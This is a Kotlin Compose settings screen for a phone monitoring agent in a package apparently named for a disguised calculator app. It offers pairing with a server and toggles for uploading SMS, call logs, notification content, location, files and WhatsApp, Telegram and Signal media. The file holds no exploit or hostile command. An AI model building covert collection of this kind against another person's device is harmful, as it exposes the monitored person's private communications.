package com.stealthcalc.monitoring.ui

import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.ChevronRight
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.RadioButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Switch
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.stealthcalc.monitoring.data.MonitoringRepository

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AgentConfigScreen(
    onBack: () -> Unit,
    viewModel: AgentConfigViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()
    var showRolePicker by remember { mutableStateOf(false) }
    var editingUrl by remember { mutableStateOf(false) }
    var editingName by remember { mutableStateOf(false) }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Monitoring") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .verticalScroll(rememberScrollState())
        ) {
            SectionHeader("Role")

            val roleLabel = when (state.role) {
                MonitoringRepository.ROLE_AGENT -> "Agent (collect & send)"
                MonitoringRepository.ROLE_DASHBOARD -> "Dashboard (view only)"
                MonitoringRepository.ROLE_BOTH -> "Both (agent + dashboard)"
                else -> "Disabled"
            }
            SettingsRow(
                title = "Device Role",
                subtitle = roleLabel,
                onClick = { showRolePicker = true },
                trailing = { Icon(Icons.Default.ChevronRight, contentDescription = null) }
            )

            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))

            SectionHeader("Server")

            SettingsRow(
                title = "Server URL",
                subtitle = state.serverUrl.ifBlank { "Not set" },
                onClick = { editingUrl = true },
                trailing = { Icon(Icons.Default.ChevronRight, contentDescription = null) }
            )

            SettingsRow(
                title = "Device Name",
                subtitle = state.deviceName.ifBlank { "Not set" },
                onClick = { editingName = true },
                trailing = { Icon(Icons.Default.ChevronRight, contentDescription = null) }
            )

            if (state.isPaired) {
                SettingsRow(
                    title = "Paired",
                    subtitle = "Device ID: ${state.deviceId.take(8)}...",
                    onClick = {},
                )
                SettingsRow(
                    title = "Unpair",
                    subtitle = "Remove server pairing",
                    onClick = viewModel::unpair,
                    trailing = { Icon(Icons.Default.ChevronRight, contentDescription = null) }
                )
            } else {
                SettingsRow(
                    title = "Pair with Server",
                    subtitle = "Enter the 6-digit OTP from the server",
                    onClick = viewModel::showOtpDialog,
                    trailing = { Icon(Icons.Default.ChevronRight, contentDescription = null) }
                )
            }

            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))

            SectionHeader("Agent Status")

            SettingsRow(
                title = "Service",
                subtitle = if (state.isServiceRunning) "Running" else "Stopped",
                onClick = {
                    if (state.isServiceRunning) viewModel.stopService() else viewModel.startService()
                },
            )

            SettingsRow(
                title = "Pending Events",
                subtitle = "${state.unsentCount} unsent",
                onClick = {},
            )

            SettingsRow(
                title = "Last Sync",
                subtitle = if (state.lastSync > 0) formatTimestamp(state.lastSync) else "Never",
                onClick = {},
            )

            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))

            SectionHeader("Metrics")

            val metrics = listOf(
                Triple("app_usage", "App Usage", "Foreground apps, time per app"),
                Triple("screen_events", "Screen Events", "Screen on/off, unlocks"),
                Triple("battery", "Battery", "Level, charging, temperature"),
                Triple("network", "Network", "WiFi SSID, connectivity"),
                Triple("app_installs", "App Installs", "Install/uninstall/update"),
                Triple("notifications", "Notifications", "Incoming notification content"),
                Triple("location", "Location", "Coarse location samples"),
                Triple("call_log", "Call Log", "Incoming/outgoing/missed calls"),
                Triple("sms", "SMS Messages", "Inbox and sent text messages"),
                Triple("media_changes", "New Photos & Videos", "Detect new media added to device"),
                Triple("security_events", "Security Events", "WiFi, Bluetooth, airplane mode changes"),
                Triple("media_upload", "Upload Photos & Videos", "Copy new media to server (< 50MB)"),
                Triple("file_sync", "File Sync", "Sync Downloads + Documents to server"),
                Triple("chat_media", "Chat Media Folders", "WhatsApp, Telegram, Signal media"),
            )

            metrics.forEach { (metricId, title, subtitle) ->
                MetricToggle(
                    title = title,
                    subtitle = subtitle,
                    checked = metricId in state.enabledMetrics,
                    onToggle = { viewModel.toggleMetric(metricId) }
                )
            }

            Spacer(modifier = Modifier.height(32.dp))
        }
    }

    if (showRolePicker) {
        RolePickerDialog(
            currentRole = state.role,
            onSelect = { role ->
                viewModel.setRole(role)
                showRolePicker = false
            },
            onDismiss = { showRolePicker = false }
        )
    }

    if (editingUrl) {
        TextInputDialog(
            title = "Server URL",
            initial = state.serverUrl,
            placeholder = "http://home.tailnet:8080",
            onConfirm = { url ->
                viewModel.setServerUrl(url)
                editingUrl = false
            },
            onDismiss = { editingUrl = false }
        )
    }

    if (editingName) {
        TextInputDialog(
            title = "Device Name",
            initial = state.deviceName,
            placeholder = "Living Room Phone",
            onConfirm = { name ->
                viewModel.setDeviceName(name)
                editingName = false
            },
            onDismiss = { editingName = false }
        )
    }

    if (state.showOtpDialog) {
        OtpDialog(
            error = state.pairingError,
            inProgress = state.pairingInProgress,
            onSubmit = viewModel::submitOtp,
            onDismiss = viewModel::hideOtpDialog,
        )
    }
}

@Composable
private fun RolePickerDialog(
    currentRole: String,
    onSelect: (String) -> Unit,
    onDismiss: () -> Unit,
) {
    val roles = listOf(
        MonitoringRepository.ROLE_DISABLED to "Disabled",
        MonitoringRepository.ROLE_AGENT to "Agent (collect & send)",
        MonitoringRepository.ROLE_DASHBOARD to "Dashboard (view only)",
        MonitoringRepository.ROLE_BOTH to "Both",
    )
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Device Role") },
        text = {
            Column {
                roles.forEach { (value, label) ->
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable { onSelect(value) }
                            .padding(vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        RadioButton(
                            selected = currentRole == value,
                            onClick = { onSelect(value) }
                        )
                        Text(label, modifier = Modifier.padding(start = 8.dp))
                    }
                }
            }
        },
        confirmButton = {
            TextButton(onClick = onDismiss) { Text("Cancel") }
        }
    )
}

@Composable
private fun OtpDialog(
    error: String?,
    inProgress: Boolean,
    onSubmit: (String) -> Unit,
    onDismiss: () -> Unit,
) {
    var otp by remember { mutableStateOf("") }
    AlertDialog(
        onDismissRequest = { if (!inProgress) onDismiss() },
        title = { Text("Enter OTP") },
        text = {
            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Text(
                    "Enter the 6-digit code shown on your dashboard or server.",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.6f)
                )
                OutlinedTextField(
                    value = otp,
                    onValueChange = { if (it.length <= 6 && it.all { c -> c.isDigit() }) otp = it },
                    label = { Text("OTP") },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )
                error?.let {
                    Text(it, color = MaterialTheme.colorScheme.error, style = MaterialTheme.typography.bodySmall)
                }
            }
        },
        confirmButton = {
            TextButton(onClick = { onSubmit(otp) }, enabled = !inProgress) {
                Text(if (inProgress) "Pairing..." else "Pair")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss, enabled = !inProgress) { Text("Cancel") }
        }
    )
}

@Composable
private fun TextInputDialog(
    title: String,
    initial: String,
    placeholder: String,
    onConfirm: (String) -> Unit,
    onDismiss: () -> Unit,
) {
    var text by remember { mutableStateOf(initial) }
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text(title) },
        text = {
            OutlinedTextField(
                value = text,
                onValueChange = { text = it },
                placeholder = { Text(placeholder) },
                singleLine = true,
                modifier = Modifier.fillMaxWidth()
            )
        },
        confirmButton = {
            TextButton(onClick = { onConfirm(text) }) { Text("Save") }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) { Text("Cancel") }
        }
    )
}

@Composable
private fun SectionHeader(title: String) {
    Text(
        text = title,
        style = MaterialTheme.typography.labelLarge,
        color = MaterialTheme.colorScheme.primary,
        modifier = Modifier.padding(horizontal = 16.dp, vertical = 12.dp)
    )
}

@Composable
private fun SettingsRow(
    title: String,
    subtitle: String,
    onClick: () -> Unit,
    trailing: @Composable (() -> Unit)? = null,
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clickable(onClick = onClick)
            .padding(horizontal = 16.dp, vertical = 12.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(modifier = Modifier.weight(1f)) {
            Text(title, style = MaterialTheme.typography.bodyLarge, color = MaterialTheme.colorScheme.onBackground)
            Text(subtitle, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.6f))
        }
        trailing?.invoke()
    }
}

@Composable
private fun MetricToggle(
    title: String,
    subtitle: String,
    checked: Boolean,
    onToggle: () -> Unit,
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clickable(onClick = onToggle)
            .padding(horizontal = 16.dp, vertical = 12.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(modifier = Modifier.weight(1f)) {
            Text(title, style = MaterialTheme.typography.bodyLarge, color = MaterialTheme.colorScheme.onBackground)
            Text(subtitle, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.6f))
        }
        Switch(checked = checked, onCheckedChange = { onToggle() })
    }
}

private fun formatTimestamp(ms: Long): String {
    val sdf = java.text.SimpleDateFormat("MMM d, h:mm a", java.util.Locale.US)
    return sdf.format(java.util.Date(ms))
}
